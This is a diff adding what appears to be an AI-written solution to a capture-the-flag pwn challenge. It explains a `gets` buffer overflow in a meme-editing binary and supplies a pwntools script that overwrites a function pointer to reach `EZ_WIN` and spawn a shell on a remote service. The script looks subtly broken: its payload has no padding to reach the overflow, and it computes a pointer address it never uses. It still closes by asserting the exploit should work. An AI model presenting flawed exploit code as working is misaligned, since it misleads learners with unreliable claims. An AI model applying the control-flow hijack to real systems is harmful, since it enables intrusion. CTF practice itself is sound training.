@@ -1,0 +1,100 @@
+To solve this challenge using `pwntools`, you need to exploit the vulnerability in the `edit_meme` function, which uses the unsafe `gets` function. This allows for a buffer overflow, enabling you to overwrite function pointers in the `memes` array. By overwriting a function pointer with the address of the `EZ_WIN` function, you can trigger the shell.
+
+Here are the steps and the corresponding code:
+
+---
+
+### Steps to Exploit the Challenge:
+
+1. **Analyze the Binary**:
+   - The `edit_meme` function uses `gets`, which is vulnerable to buffer overflow.
+   - The `print_meme` function calls a function pointer stored in the `memes` array. This pointer can be overwritten to point to `EZ_WIN`.
+
+2. **Plan the Exploit**:
+   - Use the `new_meme` function to allocate a meme and set up the `memes` array.
+   - Use the `edit_meme` function to overwrite the function pointer in the `memes` array with the address of `EZ_WIN`.
+   - Use the `print_meme` function to trigger the overwritten function pointer and execute `EZ_WIN`.
+
+3. **Write the Exploit Code**:
+   - Use `pwntools` to interact with the binary.
+   - Allocate a meme, overwrite the function pointer, and trigger the exploit.
+
+---
+
+### Exploit Code:
+
+```python
+from pwn import *
+
+# Set up the binary and context
+binary = './int'
+elf = ELF(binary)
+context.binary = binary
+
+# Addresses
+EZ_WIN = elf.symbols['EZ_WIN']  # Address of EZ_WIN function
+memes = elf.symbols['memes']    # Address of the memes array
+
+# Start the process or connect to remote
+# p = process(binary)  # For local testing
+p = remote('challenge.server.com', 1337)  # Replace with actual host and port
+
+def new_meme(size, content):
+    p.sendlineafter('Choice: ', '1')  # Select "New Meme"
+    p.sendlineafter('Enter meme size: ', str(size))  # Provide size
+    p.sendlineafter('Enter meme content: ', content)  # Provide content
+
+def edit_meme(index, content):
+    p.sendlineafter('Choice: ', '2')  # Select "Edit Meme"
+    p.sendlineafter('Index: ', str(index))  # Provide index
+    p.sendlineafter('Enter meme content: ', content)  # Provide content
+
+def print_meme(index):
+    p.sendlineafter('Choice: ', '3')  # Select "Print Meme"
+    p.sendlineafter('Index: ', str(index))  # Provide index
+
+# Step 1: Create a new meme
+new_meme(0x40, 'A' * 8)  # Create a meme with size 0x40 and some content
+
+# Step 2: Overwrite the function pointer
+# Calculate the address of the function pointer in the memes array
+index = 0  # Index of the meme to overwrite
+function_pointer_address = memes + (index * 8)
+payload = p64(EZ_WIN)  # Overwrite with the address of EZ_WIN
+edit_meme(index, payload)
+
+# Step 3: Trigger the overwritten function pointer
+print_meme(index)
+
+# Interact with the shell
+p.interactive()
+```
+
+---
+
+### Explanation of the Code:
+
+1. **Setup**:
+   - Load the binary using `pwntools` and extract the addresses of `EZ_WIN` and `memes`.
+
+2. **Functions**:
+   - `new_meme`: Allocates a new meme with the specified size and content.
+   - `edit_meme`: Edits the content of a meme at a specific index.
+   - `print_meme`: Triggers the function pointer of a meme at a specific index.
+
+3. **Exploit**:
+   - Create a new meme to initialize the `memes` array.
+   - Overwrite the function pointer in the `memes` array with the address of `EZ_WIN`.
+   - Trigger the overwritten function pointer by calling `print_meme`.
+
+4. **Shell**:
+   - Once `EZ_WIN` is executed, it spawns a shell. Use `p.interactive()` to interact with it.
+
+---
+
+### Notes:
+- Replace `challenge.server.com` and `1337` with the actual host and port if solving remotely.
+- Ensure that the binary is not stripped, so you can easily find the symbols like `EZ_WIN` and `memes`.
+- If ASLR or PIE is enabled, you may need to leak addresses to calculate the base address of the binary.
+
+This exploit should work for the given challenge. Good luck!
